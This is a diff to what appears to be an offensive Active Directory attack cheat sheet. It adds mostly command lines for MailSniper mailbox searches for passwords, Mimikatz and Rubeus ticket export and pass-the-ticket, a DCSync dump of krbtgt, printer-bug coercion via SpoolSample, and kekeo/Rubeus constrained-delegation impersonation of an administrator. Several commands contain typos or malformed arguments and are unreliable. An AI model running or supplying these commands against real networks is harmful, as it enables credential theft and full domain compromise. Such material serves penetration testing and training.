@@ -6,6 +6,7 @@
 * [MS Exchange](#MS-Exchange) 
 * [Delegation](#Delegation) 
   * [Unconstrained Delegation](#Unconstrained-delegation) 
+    * [Printer Bug](#Printer-bug) 
   * [Constrained Delegation](#Constrained-delegation) 
 * [DNS Admins](#DNS-Admins) 
 * [Enterprise Admins](#Enterprise-Admins) 
@@ -156,18 +157,38 @@ Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
+## MS Exchange
+- https://github.com/dafthack/MailSniper
+
+#### Enumerate all mailboxes
+```
+Get-GlobalAddressList -ExchHostname us-exchange -Verbose -UserName <DOMAIN>\<USER> -Password <PASSWORD>
+```
+
+#### Check access to mailboxes with current user
+```
+Invoke-OpenInboxFinder -EmailList emails.txt -ExchHostname us-exchange -Verbose
+```
+
+#### Read e-mails
+- The below command looks for terms like pass, creds, credentials from top 100 emails
+```
+Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputCsv .\mail.csv
+```
+
 ## Delegation
 ### Unconstrained Delegation
+- To execute attack owning the server with unconstrained delegation is required!
+
 #### Discover domain computers which have unconstrained delegation
-Domain Controllers always show up, ignore them
+- Domain Controllers always show up, ignore them
 ```
- . .\PowerView_dev.ps1
-Get-Netcomputer -UnConstrained
-Get-Netcomputer -UnConstrained | select samaccountname
+Get-DomainComputer -UnConstrained
+Get-DomainComputer -UnConstrained | select samaccountname
 ```
 
 #### Check if any DA tokens are available on the unconstrained machine
-Wait for a domain admin to login while checking for tokens
+- Wait for a domain admin to login while checking for tokens
 ```
 Invoke-Mimikatz -Command '"sekurlsa::tickets"'
 ```
@@ -177,12 +198,36 @@ Invoke-Mimikatz -Command '"sekurlsa::tickets"'
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
 
+```
+.\Rubeus.exe monitor /interval:5
+```
+
 #### Reuse the TGT ticket
 ```
-Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
+Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
+```
+
+```
+Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' machine:
+.\Rubeus.exe ptt /tikcet:
+```
+
+#### Run DCSync to get credentials:
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+```
+
+### Printer bug
+- A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.
+- A way to force a TGT of DC on the target machine
+- https://github.com/leechristensen/SpoolSample
+
+```
+.\MS-RPRN.exe \\<DC NAME> \\<TARGET SERVER>
 ```
 
 ### Constrained Delegation
+- To execute attack owning the user or server with constrained delegation is required.
 #### Enumerate users with contrained delegation enabled
 ```
 Get-DomainUser -TrustedToAuth
@@ -199,18 +244,25 @@ Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegat
 #### Requesting TGT with kekeo
 ```
 ./kekeo.exe
-Tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
+Tgt::ask /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM HASH>
 ```
 
 #### Requesting TGS with kekeo
 ```
-Tgs::s4u /tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
+Tgs::s4u /tgt:<TGT> /user:Administrator@<DOMAIN> /service:CIFS/<SERVER FQDN>|HTTP/<SERVER FQDN>
 ```
 
 #### Use Mimikatz to inject the TGS ticket
 ```
-Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
+Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
 ```
+
+#### Rubeus request and inject TGT + TGS
+```
+Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /msdsspn:CIFS/<SERVER FQDN> /altservice:HTTP /<SERVER FQDN> /ptt
+```
+
+#### Now you can execute commands on the server
 
 ### Constrained delegation Computer
 #### Requesting TGT with a PC hash
